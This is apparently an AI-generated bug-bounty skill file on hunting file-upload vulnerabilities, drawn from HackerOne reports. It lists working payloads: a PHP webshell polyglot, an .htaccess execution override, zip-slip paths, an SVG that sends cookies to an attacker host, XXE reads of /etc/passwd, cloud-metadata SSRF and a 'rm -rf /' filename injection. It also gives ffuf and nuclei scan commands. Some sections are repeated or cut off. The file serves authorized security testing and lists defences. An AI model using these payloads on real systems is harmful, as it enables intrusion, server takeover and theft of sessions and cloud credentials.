---
name: bbhunt-file-upload
description: "Use for upload endpoints and file processing: webshells, SVG/HTML XSS, XXE in documents, path traversal via filename, and server-side image/PDF processing. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# File Upload and File-Handling Flaws — unified methodology

> **Unified skill.** Built from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus evidence (55 valid reports, 12 paid / 22%)

Payment is not validity — zero-bounty disclosures are mined as evidence too.

### Techniques ranked across ALL valid writeups

| Technique | Reports |
|---|---:|
| file upload / filename / extension | 43 |
| second-order / stored / blind delivery | 10 |
| JWT / token / base64 decode | 6 |
| HTTP method / verb tampering | 6 |
| WAF / sanitizer / filter bypass | 6 |
| Content-Type / body-format switch | 6 |
| internal service / port / container | 6 |
| encoding / double-encode / null byte | 5 |
| cloud metadata / IAM abuse | 4 |
| public source-code / repo review | 4 |

### Parameters observed

`src`, `width`, `height`, `onerror`, `href`, `page`, `type`, `fwa`, `style`, `stroke-width`, `has_used_cb`, `details`, `case`, `mimetype`, `max-age`

### Case studies (real reports, paid and unpaid)

- [1547877](https://hackerone.com/reports/1547877) Aiven Ltd — [Kafka Connect] [JdbcSinkConnector][HttpSinkConnector] RCE by leveraging file upload via SQLite JDBC driver and SSRF to internal Jolokia ($5000, critical)
- [401483](https://hackerone.com/reports/401483) Chaturbate — [chaturbate.com] - CSRF Vulnerability on image upload ($300, medium)
- [3008878](https://hackerone.com/reports/3008878) LY Corporation — Stored XSS via SVG Upload in chat.line.biz ($100, low)

Full payload bank, bypass frequencies, approach patterns and case-study excerpts: `references/evidence.md`.

## Corpus-backed method (this class)

1. Map the full pipeline: validation, storage path/name, serving mechanism, and later processing.
2. Identify where the filename is used — storage path, content-disposition, logs, or a shell-out command.
3. Test content-type and extension checks with polyglots and double extensions appropriate to the serving stack.
4. For SVG/HTML served same-origin, test script execution in the document context, not just as an image.
5. For office/PDF/XML uploads, test parser-level SSRF/XXE and external resource loading.
6. Determine whether a stored file is executable by the server; prove RCE only with an unambiguous, bounded callback or output.

### Signals

- Any upload, import, avatar, attachment, or document conversion feature
- Filename or content-type controlled by the client
- Server-side processing with ImageMagick, LibreOffice, PDF renderers

### Kill criteria

- Files are stored outside the web root with a fixed name and no later processing.
- Uploaded content is served from a sandboxed, script-disabled origin with no parser.
- No security-relevant effect beyond accepting an unusual file type.

### Escalation chains

- Upload -> path traversal -> arbitrary write.
- SVG upload -> stored XSS in admin view.
- DOCX upload -> XXE -> SSRF.

### Veteran tip

Filename-to-shell-out is a recurring corpus pattern; read the processing code before payload fuzzing.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Test extension/MIME/content-type bypasses and double extensions.
- Try SVG, HTML, polyglot images, and office macros for stored XSS/RCE.
- Check path traversal in filenames and zip-slip in archives.
- Test access control on uploaded files (private vs public, IDOR).
- Look for image processing and thumbnail generation sinks.

### Deeper checklist

- Test extension/MIME/content-type bypasses and double extensions.
- Try SVG, HTML, polyglot images, and office macros for stored XSS/RCE.
- Check path traversal in filenames and zip-slip in archives.
- Test access control on uploaded files (private vs public, IDOR).
- Look for image processing and thumbnail generation sinks.
- Verify execution/rendering, not just successful upload.

### A. Discovery checklist — concrete places, params, headers, file types to look

- Enumerate the whole upload lifecycle, not just the upload form: where the file is stored, what name it gets, whether it is served back, from which directory/origin, and which parser later opens it.
- Classic endpoints: `/upload`, `/avatar`, `/profile-picture`, `/attachment`, `/document`, `/import`, `/export`, `/convert`, `/generate-pdf`, `/screenshot`, `/extract`, `/unzip`.
- Fields to tamper in multipart requests: `filename`, the per-part `Content-Type`, and any sibling fields such as `uploadPath`/`directory`/`type` that influence the destination path or MIME mapping.
- JSON/ODATA-style uploads carry metadata instead of raw multipart: `fileName`, `fileType`, `uploadData.content` — test each independently (2026 Hackrate case: client-side-only `.txt/.md` allowlist with no server validation).
- Server config override files: `.htaccess` (Apache), `web.config` (IIS), `.user.ini` — check whether they can be uploaded and whether the upload dir is configured to process them.
- Alternative executable extensions by stack: PHP `.php .phtml .php5 .php7 .pht .phar`; ASP/ASPX `.asp .aspx .asa .cer .soap`; JSP `.jsp .jspx .jsw .jsv .jspf`; plus `.shtml`, `.cgi`, `.pl`, `.cfm`.
- Non-RCE impact formats: `.svg` (XSS/XXE/SSRF), `.html` (stored XSS, `.hta` for client-side RCE), `.csv` (CSV injection), `.xml`/`.docx`/`.xlsx` (XXE), `.zip` (Zip Slip), `.avi` (LFI/SSRF).
- File-URL signer endpoints: inspect base64 policy fields for missing key-prefix, content-length, content-type, or expiry conditions — anonymo

### Signals and surfaces

### Signal

- Reports: **100** · paid: **20**
- Median bounty **$400** · p90 **$4,000** · max **$5,000** · total **$21,500**
- Median upvotes **14**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitHub Security Lab | 4 | $7,800 | 327 |
| Aiven Ltd | 1 | $5,000 | 56 |
| Mail.ru | 5 | $4,150 | 431 |
| Slack | 3 | $1,700 | 107 |
| Visma Public | 3 | $750 | 570 |
| TikTok | 3 | $750 | 221 |
| Linktree | 1 | $750 | 33 |
| Chaturbate | 1 | $300 | 17 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`avatar` `upload` `file` `attachment` `document` `image` `import` `archive`

### Techniques, payloads and bypasses

### Payloads & probes

- `shell.php.jpg` `shell.pHp` `shell.php%00.jpg` `shell.svg`
- `.htaccess` -> `AddType application/x-httpd-php .jpg`
- SVG -> `<svg onload=alert(1)>`
- Zip -> `../../../../var/www/shell.php`

### Bypass tricks

- Content-type spoofing, magic-byte prefixing, and polyglots.
- Double extension, trailing dot/space, and case tricks.
- Race the upload validation or overwrite an existing file.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Webshell via File Upload on ecjobs.starbucks.com.cn** — `#506646` · Starbucks · $0 · ▲688
  > I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.
- **Unrestricted File Upload Leads to RCE on mobile.starbucks.com.sg** — `#1027822` · Starbucks · $0 · ▲247
  > ko2sec discovered an .ashx endpoint on mobile.starbucks.com.sg intended for image files permitted unrestricted file type uploads which could lead to a potential RCE.
- **Unrestricted File Upload on https://partner.tiktokshop.com/wsos_v2/oec_partner/upload** — `#1890284` · TikTok · $0 · ▲118
  > An unrestricted file upload vulnerability was found on a partner.tiktokshop.com endpoint, where if the content-type in the header was changed, any extension could be uploaded.
- **Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover** — `#3115705` · Dust · $0 · ▲118
  > This allows an attacker to issue authenticated API requests on behalf of the victim, including:
- **Disclosure of all uploads to Cloudinary via hardcoded api secret in Android app** — `#351555` · Reverb.com · $0 · ▲96
  > Also this url https://api.cloudinary.com/v1 1/reverb/usage discloses statistics regarding stored files
- **Unrestricted file upload leads to Stored XSS** — `#880099` · GitLab · $0 · ▲90
  > `<?x

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 3× | `cr_in_resume_from()` |
| 3× | `ctx->read_cb` |
| 3× | `cr_in_needs_rewind()` |
| 3× | `http_resume()` |
| 2× | `ctx->has_used_cb` |
| 2× | `ctx->has_used_cb = TRUE` |
| 2× | `curl_multi_remove_handle() returned 8 / API function called from within callback / No ASAN crash` |
| 1× | `https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}` |
| 1× | `PWNED\n\nVictim Username: ${userData.user.username}\nVictim Email: ${userData.user.email}` |
| 1× | `val image = PicfitImage( / id = ImageId(s"$rel:${ThreadLocalRandom.nextString(8)}.$extension"), / // rel parameter used directly without val` |
| 1× | `curl -X POST "https://lichess.org/upload/image/user/test:evil:format:break" \ / -b "lila2=YOUR_SESSION_COOKIE" \ / -H "Origin: https://liche` |
| 1× | `/upload/image/user/{rel}` |
| 1× | `{rel}:{random12}:{random8}.{extension}` |
| 1× | `$ne` |
| 1× | `exiftool -Comment="\"><script>alert(prompt('XSS BY ZEROX4'))</script>" xss_comment_exif_metadata_double_quote.png` |
| 1× | `█████████@` |
| 1× | `<iframe srcdoc="&#x3c;script src='/file-upload/<UPLOAD ID>/payload.js?download'></script>">` |
| 1× | `.html()` |
| 1× | `SV_AddResource (t_eventscript, filename, FS_FileSize (filename), RES_FATALIFMISSING, 0);` |
| 1× | `alert(XSS)` |

### Content-Type Bypass

```
filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
filename=shell.phtml, shell.pHp, shell.php5   → extension variants
```

### File Upload Bypass Techniques (10 techniques)

| Attack | How | Prevention |
|---|---|---|
| Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5` | Allowlist + extract final extension |
| Null byte | `shell.php%00.jpg` | Sanitize null bytes |
| Double extension | `shell.jpg.php` | Only allow single extension |
| MIME spoof | Content-Type: image/jpeg with .php body | Validate magic bytes, not MIME header |
| Magic bytes prefix | Prepend `GIF89a;` to PHP code | Parse whole file, not just header |
| Polyglot | Valid as JPEG and PHP | Process as image lib, reject if invalid |
| SVG JavaScript | `<svg onload="...">` | Sanitize SVG or disallow entirely |
| XXE in DOCX | Malicious XML in Office ZIP | Disable external entities |
| ZIP slip | `../../../etc/passwd` in archive | Validate extracted paths |
| Filename injection | `; rm -rf /` in filename | Sanitize + use UUID names |

_...and 1 more sections in `references/unified-method.md`._

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### C. Validation / proof bar — how to confirm and avoid false positives

- A file that uploads but is never served, executed, or parsed is a write-only blob — not a finding. Prove the full round trip.
- RCE requires actual command output (`whoami`/`id`) from the uploaded shell, or an OOB callback emitted by it. "The file was accepted" is not execution.
- Check the `Content-Type` response header on the retrieved file — if the server serves it as `text/plain`, source disclosure may be the real impact instead of RCE.
- Stored XSS requires the script to actually fire in a victim browser, same origin as the upload; confirm the file is not sandboxed by a separate download domain or `Content-Disposition: attachment`.
- Blind upload-to-write: prove the write reached the real filesystem (directory-creation failures as an oracle), then find a secondary processor (cron, parser) to reach execution — do not assume execution from a UUID-renamed file you cannot read back.
- Distinguish client-side-only restrictions from server enforcement by replaying the request through a proxy with the UI bypassed.
- For polyglots, verify the file is still recognised as an image (`file`, `getimagesize()`) *and* that the payload survives any re-encoding (GD strips metadata — ICO files are a known exception).
- For XXE/SSRF via uploads, apply the same proof bar as the parent class: real file content or a Collaborator hit carrying data, not merely a DNS ping.
- Severity: confirmed shell RCE → Critical (CVSS 9.8 examples are common); stored XSS / same-origin script → High; write-only upload with no retriev

### Escalation and related chains

### Escalation chains

- Upload -> XSS.
- Upload + parser -> RCE.
- Zip slip -> file write.

### Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover

`#3115705` · Dust · $0 · high · 2025-05-02 · ▲118
> A stored cross-site scripting (XSS) vulnerability was discovered in the Dust platform’s file upload functionality. An attacker can upload a malicious HTML file to a conversation. When another user, including an admin, visits the uploaded file, JavaScript is executed in their authenticated browser session.

### Related Skills & Chains

- **`rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
- **`xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
- **`xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
- **`ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
-

### Related Skills & Chains

- **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
- **`hunt-xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
- **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
- **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still aliv

### Tools and wordlists

### Tools

`Burp` · `ffuf` · `exiftool` · `nuclei`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_file-upload.txt` | 65 |
| `~/.local/share/hackerone-reports/wordlists/params_file-upload.txt` | 25 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_file-upload.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_file-upload.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Test extension/MIME/polyglot bypasses manually; scan for known upload CVEs on the detected stack.

```sh
nuclei -u https://target -tags file-upload \
       -severity low,medium,high,critical -rl 40 -o nuclei_file-upload.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
       -rl 40 -o nuclei_file-upload_generic.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Source skills merged into this topic

- `h1skills` — `hackerone-file-upload`
- `hunting` — `file-upload`
- `cbh` — `hunt-file-upload`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/upstream-assets/` — 2 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
- `references/unified-method.md` — includes 2 merged companion methodology documents
- `references/corpus-wordlists/` — 2 mined paths/params/payload lists from the HackerOne corpus
- `../../upstream/` — complete unmodified archives of all five source repositories
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
